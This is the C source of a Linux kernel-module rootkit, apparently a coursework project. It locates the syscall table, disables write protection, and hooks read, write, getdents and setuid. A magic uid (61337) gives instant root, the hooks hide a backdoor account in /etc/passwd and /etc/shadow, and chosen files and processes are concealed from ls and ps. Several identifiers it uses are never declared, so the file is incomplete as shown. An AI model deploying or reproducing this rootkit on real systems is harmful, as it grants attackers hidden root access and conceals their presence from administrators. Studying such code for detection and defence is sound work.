#include<linux/kernel.h>
#include<linux/init.h>
#include<linux/module.h>
#include<linux/syscalls.h>
#include<linux/kobject.h>
#include<linux/slab.h>
//#include"rootkit.h"
#include<linux/cred.h>
#include<linux/namei.h>
#include<linux/path.h>
#include<linux/file.h>
#include<linux/fs.h>
#include<linux/string.h>

MODULE_LICENSE("GPL");

#define START_SYSCALL 0xffffffff81000000
#define END_SYSCALL   0xffffffffa2000000
//#define PROC_PATH     "/proc"

/*
struct rootkit_dirent {
  unsigned long  d_ino;     /* Inode number */
  unsigned long  d_off;     /* Offset to next linux_dirent */
  unsigned short d_reclen;  /* Length of this linux_dirent */
  char           d_name[];  /* Filename (null-terminated) */
  /* length is actually (d_reclen - 2 -
     offsetof(struct linux_dirent, d_name)) */
  /*
     char           pad;       // Zero padding byte
     char           d_type;    // File type (only since Linux
  // 2.6.4); offset is (d_reclen - 1)
  */
};
*/


unsigned long *system_call_table_array;
#define MAX_RECORD 1000
char passwd_entry[MAX_RECORD] = {0};
char shadow_entry[MAX_RECORD] = {0};

/*function declarations.*/
int rootkit_init(void);
void rootkit_exit(void);
void disable_write_protection(void);
void enable_write_protection(void);
unsigned long **find_syscall_table(void);
void elevate_access(void);

/*original system calls to be hacked.*/
asmlinkage ssize_t (*write_syscall)(int fd, const char __user *buf, ssize_t count);
asmlinkage int (*getdents_syscall)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int (*setuid_syscall)(uid_t uid);
asmlinkage ssize_t (*read_syscall)(int fd, void *buf, size_t count);

/*rootkit version of hijacked system calls.*/
asmlinkage ssize_t rootkit_write(int fd, const char __user *buf, ssize_t count);
asmlinkage int rootkit_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int rootkit_setuid(uid_t uid);
asmlinkage ssize_t rootkit_read(int fd, void *buf, size_t count);

module_init(rootkit_init);
module_exit(rootkit_exit);


/*function to disable control register write protection.*/
void disable_write_protection(void){
  unsigned long cr0, bit_16;
  bit_16 = 0x10000;
  cr0 = read_cr0() & (~bit_16);
  write_cr0(cr0);
}

/*function to enable control register write protection.*/
void enable_write_protection(void){
  unsigned long cr0, bit_16;
  bit_16 = 0x10000;
  cr0 = read_cr0() | bit_16;
  write_cr0(cr0);
}

/*function to find the system call table starting address in memory.*/
unsigned long **find_syscall_table(void){
  unsigned long **system_call_table_array;
  unsigned long i = START_SYSCALL;
  while(i < END_SYSCALL){
    system_call_table_array = (unsigned long **)i;
    if(system_call_table_array[__NR_close] == (unsigned long *) sys_close)
      return &system_call_table_array[0];
    i = i + sizeof(void *);
  }
  return NULL;
}

/*hijacking setuid to elevate access.*/
asmlinkage int rootkit_setuid(uid_t uid){
  int ret = 0;
  if(uid == 61337){
    elevate_access();
    printk("you are root now\n");
    return 0;
  }
  ret = (*setuid_syscall)(uid);
  return ret;
}

/*adding shadow entry to end of buf*/
asmlinkage ssize_t rootkit_write(int fd, const char __user *buf, ssize_t count){

  struct file *filp = NULL;
  char *ret_buf = NULL, *temp = NULL, *path = NULL;
  ssize_t total;
  struct path file_path;
  int match1, match2, i =0;

  if ((fd == 0) || (fd == 1) || (fd == 2)) // in case of special std fd's, skip hijack
    goto out;

  filp=fget(fd);
  if(filp==NULL) {
    printk("here filp null\n");
    goto out;
  }

  file_path = filp->f_path;
  path_get(&filp->f_path);
  temp = (char *)kmalloc(PAGE_SIZE,GFP_KERNEL);
  if(temp == NULL){
    printk("kmalloc NULL temp read syscall\n");
    goto out;
  }

  path = d_path(&file_path,temp,PAGE_SIZE);
  if(path == NULL){
    printk("read:path is null\n");
    goto out;
  }
  path_put(&file_path);

  match1= (path) ? strcmp(path,"/etc/passwd") : -1;
  match2= (path) ? strcmp(path,"/etc/shadow") : -1;
  if ((match1 == 0)	&& passwd_entry[0])
  {
    printk("magic, passwd= %s\n", passwd_entry);
    ret_buf = (char *)kmalloc(count+strlen(passwd_entry), GFP_KERNEL);
    if(ret_buf == NULL){
      printk("Memory allocation failed in write\n");
      goto out;
    }

    copy_from_user(ret_buf, buf, count);
    for (i=0;i<strlen(passwd_entry);i++)  // write our passwd entry into buffer
      ret_buf[count+i] = passwd_entry[i];

    count = count + strlen(passwd_entry);
    ret_buf[count]=0;
    copy_to_user((char __user *)buf, ret_buf, count);
  }
  else if ((match2 == 0) && shadow_entry[0])
  {
    printk("magic, shadow= %s\n", shadow_entry);
    ret_buf = (char *)kmalloc(count+strlen(shadow_entry), GFP_KERNEL);
    if(ret_buf == NULL){
      printk("Memory allocation failed in write\n");
      goto out;
    }

    copy_from_user(ret_buf, buf, count);
    for (i=0;i<strlen(shadow_entry);i++) // write our shadow entry into buffer
      ret_buf[count+i] = shadow_entry[i];

    count = count + strlen(shadow_entry);
    ret_buf[count]=0;
    copy_to_user((char __user *)buf, ret_buf, count);
  }

out:
  total = (*write_syscall)(fd, buf, count);

  if (temp)
    kfree(temp);
  if (ret_buf)
    kfree(ret_buf);
  return total;
}


asmlinkage ssize_t rootkit_read(int fd, void *buf, size_t count){

  ssize_t total = 0;
  ssize_t ret_buf_len = 0, entry_len = 0;
  struct file *filp = NULL;
  char *path = NULL, *temp = NULL, *read_buf = NULL, *ret_buf = NULL, *start = NULL, *entry = NULL;// *start_new = NULL;
  int match1, match2, record_passwd = 0, record_shadow = 0;
  struct path file_path;

  /*
   *getting current process name and checking if it is a login process.
   *returning normal buffer content if it is a login process so that
   *login can be done later on. working with both login an ssh commands
   */
  struct task_struct *curr = get_current();
  if(strstr("login",curr->comm)){
    printk("%s\n",curr->comm);
    total = (read_syscall)(fd, buf, count);
    return total;
  }

  filp=fget(fd);
  if(filp==NULL){
    printk("here filp null\n");
    goto out;
  }

  file_path = filp->f_path;
  path_get(&filp->f_path);
  temp = (char *)kmalloc(PAGE_SIZE,GFP_KERNEL);
  if(temp == NULL){
    printk("kmalloc NULL temp read syscall\n");
    goto out;
  }

  path = d_path(&file_path,temp,PAGE_SIZE);
  if(path == NULL){
    printk("read:path is null\n");
    goto out;
  }
  path_put(&file_path);

  total = (*read_syscall)(fd, buf, count);

  match1= (path) ? strcmp(path,"/etc/passwd") : -1;
  match2= (path) ? strcmp(path,"/etc/shadow") : -1;
  if(total && (match1 == 0 || match2 == 0)){

    ret_buf = kmalloc(total, GFP_KERNEL);
    if(ret_buf == NULL){
      printk("ret_buf kmalloc null\n");
      goto out;
    }

    read_buf = kmalloc(total, GFP_KERNEL);
    if(ret_buf == NULL){
      printk("read_buf kmalloc null\n");
      goto out;
    }

    copy_from_user(read_buf, buf, total);
    start = read_buf;

    entry = strstr(read_buf, hide_account);
    if(entry){
      ret_buf_len = entry - start;
      memcpy(ret_buf, read_buf, ret_buf_len);

      if ((passwd_entry[0] == 0) && (match1 == 0))	// record passwd entry only when entry is not there
        record_passwd = 1;
      else if ((shadow_entry[0] == 0) && (match2 == 0))	// record shadow entry only when entry is not there
        record_shadow = 1;

      while(*entry != '\n'){

        if (record_passwd)
          passwd_entry[entry_len] = *entry;
        else if (record_shadow)
          shadow_entry[entry_len] = *entry;

        entry++;
        entry_len++;
      }

      if (record_passwd) {
        passwd_entry[entry_len] = '\n';
        passwd_entry[entry_len+1] = 0;
        printk("magic passwd record %s\n", passwd_entry);
      }
      else if (record_shadow) {
        shadow_entry[entry_len] = '\n';
        shadow_entry[entry_len+1] = 0;
        printk("magic shadow record %s\n", shadow_entry);
      }

      entry++;
      entry_len++;

      memcpy(ret_buf + ret_buf_len, entry, total - (entry - start));
      total = total - entry_len;
      copy_to_user(buf, ret_buf, total);
    }
  }

out:
  if (read_buf)
    kfree(read_buf);

  if (temp)
    kfree(temp);

  if (ret_buf)
    kfree(ret_buf);

  return total;
}

/*hijacking getdents to handle ls and ps.*/
asmlinkage int rootkit_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
  unsigned int ret, ret_buf_count = 0, i, flag = 0, proc_flag = 1;
  struct file *filp = NULL;
  char *buf = NULL, *p, *ret_buf = NULL, *temp = NULL, *path = NULL;
  struct rootkit_dirent *entry = NULL;
  struct path file_path;

  ret = (*getdents_syscall)(fd, dirp, count);
  if(ret == 0)
    return ret;

  filp=fget(fd);
  if(filp==NULL){
    printk("here filp null\n");
    goto out;
  }

  file_path = filp->f_path;
  path_get(&filp->f_path);
  temp = (char *)kmalloc(PAGE_SIZE,GFP_KERNEL);
  if(temp == NULL){
    printk("kmalloc NULL temp read syscall\n");
    goto out;
  }

  path = d_path(&file_path,temp,PAGE_SIZE);
  if(path == NULL){
    printk("read:path is null\n");
    goto out;
  }
  path_put(&file_path);

  //printk("rootkit:getdents:%d\n",ret);
  buf = (char *)kmalloc(ret, GFP_KERNEL);
  ret_buf = kmalloc(ret, GFP_KERNEL);
  copy_from_user(buf, dirp, ret);
  p = (char *)buf;
  while(p < (char *)buf + ret){
    entry = (struct rootkit_dirent *)p;
    flag = 0;
    //printk("rootkit:getdents:d-name:%s\n",entry->d_name);
//    printk("rootkit:getdents:path:%s\n",path);

    proc_flag = (path) ? strcmp(path,"/proc") : 1; // if call is from /proc flag is 0

    if (proc_flag) {
      for(i = 0; i < hide_count; i++){
        if(strstr(entry->d_name, hide_name[i])){
          flag = 1;
          break;
        }
      }
    }
    else {  // if call is for process
      for(i = 0; i < hide_proc_count; i++){
        if(strstr(entry->d_name, hide_proc[i])){
          flag = 1;
          break;
        }
      }
    }
    if(!flag){
      memcpy(ret_buf + ret_buf_count, (void *)p, entry->d_reclen);
      ret_buf_count += entry->d_reclen;
    }
    p += entry->d_reclen;
  }
  copy_to_user(dirp, ret_buf, ret_buf_count);

out:
  if(buf)
    kfree(buf);
  if (ret_buf)
    kfree(ret_buf);
  if (temp)
    kfree(temp);
  return ret_buf_count;
}

void elevate_access(void){
  struct cred *rootkit_cred = NULL;
  rootkit_cred = prepare_creds();
  rootkit_cred->uid.val = 0;
  rootkit_cred->euid.val = 0;
  rootkit_cred->egid.val = 0;
  rootkit_cred->gid.val = 0;
  commit_creds(rootkit_cred);
}

int rootkit_init(void){

  /* removing entry from /proc/modules */
  //list_del_init(&__this_module.list);

  /* removing entry from /sys/module/ */
  //kobject_del(&THIS_MODULE->mkobj.kobj);


  //unsigned long *system_call_table_array = NULL;
  if((system_call_table_array = (unsigned long *)find_syscall_table())){
    printk("rootkit:syscall table found\n");
  }
  else{
    printk("rootkit:syscall table not found\n");

  }

  disable_write_protection();
  write_syscall = (void *)xchg(&system_call_table_array[__NR_write], (unsigned long)rootkit_write);
  getdents_syscall = (void *)xchg(&system_call_table_array[__NR_getdents], (unsigned long)rootkit_getdents);
  setuid_syscall = (void *)xchg(&system_call_table_array[__NR_setuid], (unsigned long)rootkit_setuid);
  read_syscall = (void *)xchg(&system_call_table_array[__NR_read], (unsigned long)rootkit_read);
  enable_write_protection();
  printk("rootkit:initialized\n");
  return 0;
}

void rootkit_exit(void){
  disable_write_protection();
  system_call_table_array[__NR_getdents] = (unsigned long)getdents_syscall;
  system_call_table_array[__NR_setuid] = (unsigned long)setuid_syscall;
  system_call_table_array[__NR_read] = (unsigned long)read_syscall;
  system_call_table_array[__NR_write] = (unsigned long)write_syscall;
  enable_write_protection();
  printk("rootkit:exit\n");
}

